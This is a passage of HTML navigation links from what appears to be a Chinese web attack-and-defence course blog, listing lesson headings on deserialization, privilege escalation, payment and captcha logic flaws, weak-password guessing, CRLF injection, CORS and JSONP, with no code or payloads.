class="nav-text">#PHP反序列化漏洞</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E5%88%A9%E7%94%A8%E7%82%B9%E5%88%86%E6%9E%90%EF%BC%9A"><span class="nav-number">44.0.0.4.</span> <span class="nav-text">#魔术方法利用点分析：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-22"><span class="nav-number">44.0.0.5.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTFSHOW-%E5%85%B3%E5%8D%A1254-260%E5%8E%9F%E7%94%9F%E7%B1%BB-POP%E6%9E%84%E9%80%A0"><span class="nav-number">44.0.0.6.</span> <span class="nav-text">#CTFSHOW-关卡254-260原生类&amp;POP构造</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#254%E5%AF%B9%E8%B1%A1%E5%BC%95%E7%94%A8%E6%89%A7%E8%A1%8C%E9%80%BB%E8%BE%91"><span class="nav-number">44.0.0.6.0.1.</span> <span class="nav-text">254对象引用执行逻辑</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#255%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%98%E9%87%8F%E4%BF%AE%E6%94%B91"><span class="nav-number">44.0.0.6.0.2.</span> <span class="nav-text">255反序列化变量修改1</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#256-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%82%E6%95%B0%E4%BF%AE%E6%94%B92"><span class="nav-number">44.0.0.6.0.3.</span> <span class="nav-text">256-反序列化参数修改2</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#257-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%82%E6%95%B0%E4%BF%AE%E6%94%B9-%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8%E9%80%BB%E8%BE%91"><span class="nav-number">44.0.0.6.0.4.</span> <span class="nav-text">257-反序列化参数修改&amp;对象调用逻辑</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#258-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8F%82%E6%95%B0%E4%BF%AE%E6%94%B9-%E5%AF%B9%E8%B1%A1%E8%B0%83%E7%94%A8%E9%80%BB%E8%BE%91"><span class="nav-number">44.0.0.6.0.5.</span> <span class="nav-text">258-反序列化参数修改&amp;对象调用逻辑</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#259-%E5%8E%9F%E7%94%9F%E6%80%81%E7%B1%BB8Call%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%958%E9%85%8D%E5%8F%B0SSRF"><span class="nav-number">44.0.0.6.0.6.</span> <span class="nav-text">259-原生态类8Call魔术方法8配台SSRF</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC46%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E5%8E%9F%E7%94%9F%E7%B1%BB-%E6%BC%8F%E6%B4%9E%E7%BB%95%E8%BF%87-%E5%85%AC%E7%A7%81%E6%9C%89%E5%B1%9E%E6%80%A7"><span class="nav-number">45.</span> <span class="nav-text">第46天：WEB攻防-通用漏洞&amp;PHP反序列化&amp;原生类&amp;漏洞绕过&amp;公私有属性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-26"><span class="nav-number">45.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%A9%E7%94%A8%E5%A4%A7%E6%A6%82%E5%88%86%E7%B1%BB%E4%B8%89%E7%B1%BB"><span class="nav-number">45.0.0.2.</span> <span class="nav-text">#反序列化利用大概分类三类</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%AF%BE%E7%A8%8B%E7%82%B9%EF%BC%9A-1"><span class="nav-number">45.0.0.3.</span> <span class="nav-text">#反序列化课程点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-23"><span class="nav-number">45.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95-%E5%B1%9E%E6%80%A7-%E8%B0%83%E7%94%A8%E8%AF%A6%E8%A7%A3-%E5%8F%98%E9%87%8F%E6%95%B0%E6%8D%AE%E8%AF%A6%E8%A7%A3"><span class="nav-number">45.0.0.5.</span> <span class="nav-text">#方法&amp;属性-调用详解&amp;变量数据详解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF%E8%AF%AD%E8%A8%80%E6%BC%8F%E6%B4%9E-wakeup%EF%BC%88%EF%BC%89%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="nav-number">45.0.0.6.</span> <span class="nav-text">#CTF语言漏洞-wakeup（）方法绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF-%E6%96%B9%E6%B3%95%E5%8E%9F%E7%94%9F%E7%B1%BB%E8%8E%B7%E5%8F%96-%E5%88%A9%E7%94%A8-%E9%85%8D%E5%90%88%E5%85%B6%E4%BB%96"><span class="nav-number">45.0.0.7.</span> <span class="nav-text">CTF-方法原生类获取&amp;利用&amp;配合其他</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#%E6%AD%A4%E5%A4%84%E5%9B%9E%E9%A1%BE%E4%BA%86ctfshow-259%E5%85%B3"><span class="nav-number">45.0.0.7.1.</span> <span class="nav-text">此处回顾了ctfshow 259关</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#%E5%9B%9E%E9%A1%BEctfshow259-%E5%88%A9%E7%94%A8%E5%8E%9F%E7%94%9F%E7%B1%BB"><span class="nav-number">45.0.0.7.1.1.</span> <span class="nav-text">回顾ctfshow259 利用原生类</span></a></li></ol></li></ol></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC47%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-EXP%E7%94%9F%E6%88%90-%E6%95%B0%E6%8D%AE%E6%8F%90%E5%8F%96-%E7%BB%84%E4%BB%B6%E5%AE%89%E5%85%A8"><span class="nav-number">46.</span> <span class="nav-text">第47天 WEB攻防-通用漏洞&amp;Java反序列化&amp;EXP生成&amp;数据提取&amp;组件安全</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-27"><span class="nav-number">46.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%86%85%E5%AE%B9%E7%82%B9%EF%BC%9A"><span class="nav-number">46.0.0.2.</span> <span class="nav-text">#内容点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86"><span class="nav-number">46.0.0.3.</span> <span class="nav-text">#前置知识</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%87%BD%E6%95%B0%E6%8E%A5%E5%8F%A3%EF%BC%9A"><span class="nav-number">46.0.0.4.</span> <span class="nav-text">函数接口：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E5%87%BA%E7%8E%B0%EF%BC%9A"><span class="nav-number">46.0.0.5.</span> <span class="nav-text">数据出现：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8F%91%E7%8E%B0%EF%BC%9A"><span class="nav-number">46.0.0.6.</span> <span class="nav-text">发现：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-24"><span class="nav-number">46.0.0.7.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%94%9FAPI-Ysoserial-URLDNS%E4%BD%BF%E7%94%A8"><span class="nav-number">46.0.0.8.</span> <span class="nav-text">#原生API-Ysoserial URLDNS使用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%89%E6%96%B9%E7%BB%84%E4%BB%B6-Ysoserial%E6%94%AF%E6%8C%81%E5%BA%93%E7%94%9F%E6%88%90%E4%BE%BF%E7%94%A8"><span class="nav-number">46.0.0.9.</span> <span class="nav-text">#三方组件-Ysoserial支持库生成便用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC48%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-Py%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-%E9%93%BE%E6%9E%84%E9%80%A0-%E8%87%AA%E5%8A%A8%E5%AE%A1%E8%AE%A1bandit-%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95"><span class="nav-number">47.</span> <span class="nav-text">第48天：WEB攻防-通用漏洞&amp;Py反序列化&amp;链构造&amp;自动审计bandit&amp;魔术方法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-28"><span class="nav-number">47.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A-1"><span class="nav-number">47.0.0.2.</span> <span class="nav-text">#前置知识：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-25"><span class="nav-number">47.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8E%9F%E7%90%86%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%E8%B0%83%E7%94%A8%E7%90%86%E8%A7%A3"><span class="nav-number">47.0.0.4.</span> <span class="nav-text">#原理反序列化魔术方法调用理解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%9E%84%E9%80%A0-RCE"><span class="nav-number">47.0.0.5.</span> <span class="nav-text">#CTF-反序列化漏洞利用构造&amp;RCE</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CTF-%E5%8D%8E%E5%8C%97JWT-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="nav-number">47.0.0.6.</span> <span class="nav-text">#CTF-华北JWT&amp;反序列化</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E8%87%AA%E5%8A%A8%E5%8C%96%E5%B7%A5%E5%85%B7band%E5%AE%89%E8%A3%85%E5%8F%8A%E4%BD%BF%E7%94%A8"><span class="nav-number">47.0.0.7.</span> <span class="nav-text">#代码审计-自动化工具band安装及使用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC49%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E4%B8%9A%E5%8A%A1%E9%80%BB%E8%BE%91-%E6%B0%B4%E5%B9%B3%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83-%E8%AE%BF%E9%97%AE%E6%8E%A7%E5%88%B6-%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81"><span class="nav-number">48.</span> <span class="nav-text">第49天：WEB攻防-通用漏洞&amp;业务逻辑&amp;水平垂直越权&amp;访问控制&amp;脆弱验证</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-29"><span class="nav-number">48.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A-2"><span class="nav-number">48.0.0.2.</span> <span class="nav-text">#前置知识：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-26"><span class="nav-number">48.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90-%E6%B0%B4%E5%B9%B3%E8%B6%8A%E6%9D%83-YXCMS%E6%A3%80%E6%BA%AA%E6%95%B0%E6%8D%AE%E6%AF%94%E5%AF%B9%E5%BC%B1"><span class="nav-number">48.0.0.4.</span> <span class="nav-text">#权限-水平越权-YXCMS检溪数据比对弱</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9D%83%E9%99%90-%E5%9E%82%E7%9B%B4%E8%B6%8A%E6%9D%83MINICMS%E6%9D%83%E9%99%90%E6%93%8D%E4%BD%9C%E6%97%A0%E9%AA%8C%E8%AF%81"><span class="nav-number">48.0.0.5.</span> <span class="nav-text">#权限-垂直越权MINICMS权限操作无验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%AA%E6%8E%88%E6%9D%83-%E8%84%86%E5%BC%B1%E6%9C%BA%E5%88%B6-XHCMS-Cookie%E8%84%86%E5%BC%B1%E9%AA%8C%E8%AF%81"><span class="nav-number">48.0.0.6.</span> <span class="nav-text">#未授权-脆弱机制-XHCMS-Cookie脆弱验证</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BC%B1%E6%9C%BA%E5%88%B6-%E7%A9%BA%E5%8F%A3%E4%BB%A4%E6%9C%BA%E5%88%B6-Redis-Weblogics%E5%BC%B1%E6%9C%BA%E5%88%B6"><span class="nav-number">48.0.0.7.</span> <span class="nav-text">#弱机制-空口令机制-Redis&amp;Weblogics弱机制</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A3%80%E6%B5%8B%E7%B1%BB-%E5%B7%A5%E5%85%B7%E9%A1%B9%E7%9B%AE-Authz-Secscan-Authcheck"><span class="nav-number">48.0.0.8.</span> <span class="nav-text">#检测类-工具项目-Authz&amp;Secscan-Authcheck</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC50%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B4%AD%E4%B9%B0%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E8%AF%B7%E6%B1%82%E9%87%8D%E6%94%BE-%E6%8E%A5%E5%8F%A3%E6%9B%BF%E6%8D%A2"><span class="nav-number">49.</span> <span class="nav-text">第50天：WEB攻防-通用漏洞&amp;购买支付逻辑&amp;数据篡改&amp;请求重放&amp;接口替换</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-30"><span class="nav-number">49.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-10"><span class="nav-number">49.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%AB%A0%E8%8A%82%E5%86%85%E5%AE%B9%EF%BC%9A"><span class="nav-number">49.0.0.3.</span> <span class="nav-text">#章节内容：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-27"><span class="nav-number">49.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%95%B0%E6%8D%AE%E7%AF%A1%E6%94%B9-%E4%BB%B7%E6%A0%BC-%E6%95%B0%E9%87%8F-%E4%BA%A7%E5%93%81"><span class="nav-number">49.0.0.5.</span> <span class="nav-text">#数据篡改-价格&amp;数量&amp;产品</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BF%AE%E6%94%B9%E6%96%B9%E5%BC%8F-%E8%AE%A2%E5%8D%95%E5%8F%B7-%E6%95%B0%E9%87%8F-%E4%BC%98%E6%83%A0%E5%88%B8"><span class="nav-number">49.0.0.6.</span> <span class="nav-text">#修改方式-订单号&amp;数量&amp;优惠券</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%90%E5%AE%9E%E4%BE%8B-%E6%BC%94%E7%A4%BA%E7%AB%99%E4%BA%A4%E6%98%93%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91%E5%AE%89%E5%85%A8"><span class="nav-number">49.0.0.7.</span> <span class="nav-text">#某实例-演示站交易支付逻辑安全</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1-%E4%B8%9A%E5%8A%A1%E6%94%AF%E4%BB%98%E9%80%BB%E8%BE%91-%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D"><span class="nav-number">49.0.0.8.</span> <span class="nav-text">#代码审计-业务支付逻辑&amp;安全修复</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC51%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E5%A4%8D%E7%94%A8-%E8%B0%83%E7%94%A8-%E6%89%BE%E5%9B%9E%E5%AF%86%E7%A0%81%E9%87%8D%E5%AE%9A%E5%90%91-%E7%8A%B6%E6%80%81%E5%80%BC"><span class="nav-number">50.</span> <span class="nav-text">第51天：WEB攻防-通用漏洞&amp;验证码识别&amp;复用&amp;调用&amp;找回密码重定向&amp;状态值</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-31"><span class="nav-number">50.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-11"><span class="nav-number">50.0.0.2.</span> <span class="nav-text">#详细点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AE%89%E5%85%A8%E4%BF%AE%E5%A4%8D%E6%96%B9%E6%A1%88%EF%BC%9A"><span class="nav-number">50.0.0.3.</span> <span class="nav-text">#安全修复方案：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-28"><span class="nav-number">50.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#phpun-res-%E5%80%BC%E4%BF%AE%E6%94%B9-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%9B%9E%E6%98%BE-%E7%88%86%E7%A0%B4"><span class="nav-number">50.0.0.5.</span> <span class="nav-text">#phpun-res 值修改&amp;验证码回显&amp;爆破</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9F%90-APP-res-%E5%80%BC%E4%BF%AE%E6%94%B9-%E9%AA%8C%E8%AF%81%E7%A0%81%E6%8E%A5%E5%8F%A3%E8%B0%83%E7%94%A8-%E5%A4%8D%E7%94%A8"><span class="nav-number">50.0.0.6.</span> <span class="nav-text">#某 APP-res 值修改&amp;验证码接口调用&amp;复用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#seacms-%E9%AA%8C%E8%AF%81%E7%A0%81%E8%AF%86%E5%88%AB-%E6%89%BE%E5%9B%9E%E6%9C%BA%E5%88%B6%E5%AF%B9%E5%BA%94%E5%80%BC%E4%BF%AE%E6%94%B9"><span class="nav-number">50.0.0.7.</span> <span class="nav-text">#seacms-验证码识别&amp;找回机制对应值修改</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC52%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E5%BC%B1%E5%8F%A3%E4%BB%A4%E5%AE%89%E5%85%A8-%E7%A4%BE%E5%B7%A5%E5%AD%97%E5%85%B8%E7%94%9F%E6%88%90-%E6%9C%8D%E5%8A%A1%E5%8D%8F%E8%AE%AE-Web%E5%BA%94%E7%94%A8"><span class="nav-number">51.</span> <span class="nav-text">第52天：WEB攻防-通用漏洞&amp;弱口令安全&amp;社工字典生成&amp;服务协议&amp;Web应用</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-32"><span class="nav-number">51.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%EF%BC%9A-3"><span class="nav-number">51.0.0.2.</span> <span class="nav-text">#前置知识：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-29"><span class="nav-number">51.0.0.3.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Web-%E7%B1%BB-%E5%8A%A0%E5%AF%86-%E9%AA%8C%E8%AF%81%E7%A0%81%E5%90%8E%E5%8F%B0%E7%8C%9C%E8%A7%A3"><span class="nav-number">51.0.0.4.</span> <span class="nav-text">#Web 类-加密&amp;验证码后台猜解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%9C%8D%E5%8A%A1%E7%B1%BB%E2%80%93SSH-RDP%E8%BF%9C%E7%A8%8B%E7%BB%88%E7%AB%AF%E7%8C%9C%E8%A7%A3"><span class="nav-number">51.0.0.5.</span> <span class="nav-text">#服务类–SSH&amp;RDP远程终端猜解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%BA%94%E7%94%A8%E7%B1%BB-ZIP-WORD%E6%96%87%E4%BB%B6%E5%8E%8B%E7%BC%A9%E5%8C%85%E7%8C%9C%E8%A7%A3"><span class="nav-number">51.0.0.6.</span> <span class="nav-text">#应用类-ZIP&amp;WORD文件压缩包猜解</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%AD%97%E5%85%B8%E7%B1%BB%E5%AF%86%E6%96%87%E6%94%B6%E7%BE%8E-%E5%BC%B1%E5%8F%A3%E4%BB%A4-%E8%87%AA%E5%AE%9A%E4%B9%89%E7%94%9F%E6%88%90"><span class="nav-number">51.0.0.7.</span> <span class="nav-text">#字典类密文收美&amp;弱口令&amp;自定义生成</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC53%E5%A4%A9%EF%BC%9AWEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-CRLF%E6%B3%A8%E5%85%A5-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E8%B5%84%E6%BA%90%E5%A4%84%E7%90%86%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="nav-number">52.</span> <span class="nav-text">第53天：WEB攻防-通用漏洞&amp;CRLF注入&amp;URL重定向&amp;资源处理拒绝服务</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-33"><span class="nav-number">52.0.0.1.</span> <span class="nav-text">#知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E4%B8%8B%E8%8A%82%E9%A2%84%E5%91%8A%EF%BC%9A"><span class="nav-number">52.0.0.2.</span> <span class="nav-text">#下节预告：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E8%AF%A6%E7%BB%86%E7%82%B9%EF%BC%9A-12"><span class="nav-number">52.0.0.3.</span> <span class="nav-text">#详细点：</span></a><ol class="nav-child"><li class="nav-item nav-level-6"><a class="nav-link" href="#1-CRLF-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%EF%BC%8C%E6%98%AF%E5%9B%A0%E4%B8%BA-Web-%E5%BA%94%E7%94%A8%E6%B2%A1%E6%9C%89%E5%AF%B9%E7%94%A8%E6%88%B7%E8%BE%93%E5%85%A5%E5%81%9A%E4%B8%A5%E6%A0%BC%E9%AA%8C%E8%AF%81%EF%BC%8C%E5%AF%BC%E8%87%B4%E6%94%BB%E5%87%BB%E8%80%85%E5%8F%AF%E4%BB%A5%E8%BE%93%E5%85%A5%E4%B8%80"><span class="nav-number">52.0.0.3.0.1.</span> <span class="nav-text">1.CRLF 注入漏洞，是因为 Web 应用没有对用户输入做严格验证，导致攻击者可以输入一</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#2-URL-%E9%87%8D%E5%AE%9A%E5%90%91%E8%B7%B3%E8%BD%AC"><span class="nav-number">52.0.0.3.0.2.</span> <span class="nav-text">2.URL 重定向跳转</span></a></li><li class="nav-item nav-level-6"><a class="nav-link" href="#3-Web-%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1"><span class="nav-number">52.0.0.3.0.3.</span> <span class="nav-text">3.Web 拒绝服务</span></a></li></ol></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%BC%94%E7%A4%BA%E6%A1%88%E4%BE%8B%EF%BC%9A-30"><span class="nav-number">52.0.0.4.</span> <span class="nav-text">演示案例：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B1-CRLF%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8"><span class="nav-number">52.0.0.5.</span> <span class="nav-text">#案例1-CRLF注入原理&amp;检测&amp;利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B2-URL%E9%87%8D%E5%AE%9A%E5%90%91-%E5%8E%9F%E7%90%86-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8"><span class="nav-number">52.0.0.6.</span> <span class="nav-text">#案例2-URL重定向&amp;原理&amp;检测&amp;利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%A1%88%E4%BE%8B3-WEB%E6%8B%92%E7%BB%9D%E6%9C%8D%E5%8A%A1-%E5%8E%9F%E7%90%86-%E6%A3%80%E6%B5%8B-%E5%88%A9%E7%94%A8"><span class="nav-number">52.0.0.7.</span> <span class="nav-text">案例3-WEB拒绝服务-原理&amp;检测&amp;利用</span></a></li></ol></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E7%AC%AC54%E5%A4%A9-WEB%E6%94%BB%E9%98%B2-%E9%80%9A%E7%94%A8%E6%BC%8F%E6%B4%9E-%E8%B7%A8%E5%9F%9FCORS%E8%B5%84%E6%BA%90-JSONP%E5%9B%9E%E8%B0%83-%E5%9F%9F%E5%90%8D%E6%8E%A5%E7%AE%A1%E5%8A%AB%E6%8C%81"><span class="nav-number">53.</span> <span class="nav-text">第54天 WEB攻防-通用漏洞&amp;跨域CORS资源&amp;JSONP回调&amp;域名接管劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A-34"><span class="nav-number">53.0.0.1.</span> <span class="nav-text">知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%89%8D%E7%BD%AE%E7%9F%A5%E8%AF%86%E7%82%B9%EF%BC%9A"><span class="nav-number">53.0.0.2.</span> <span class="nav-text">#前置知识点：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#COSP%E8%B7%A8%E5%9F%9F%E8%B5%84%E6%BA%90%EF%BC%88%E4%B8%BA%E4%BA%86%E8%A7%A3%E5%86%B3%E9%9D%9E%E5%90%8C%E5%9F%9F%E5%90%8D%E8%B5%84%E6%BA%90%E8%B0%83%E7%94%A8%E7%9A%84%E9%97%AE%E9%A2%98%EF%BC%89"><span class="nav-number">53.0.0.3.</span> <span class="nav-text">COSP跨域资源（为了解决非同域名资源调用的问题）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" 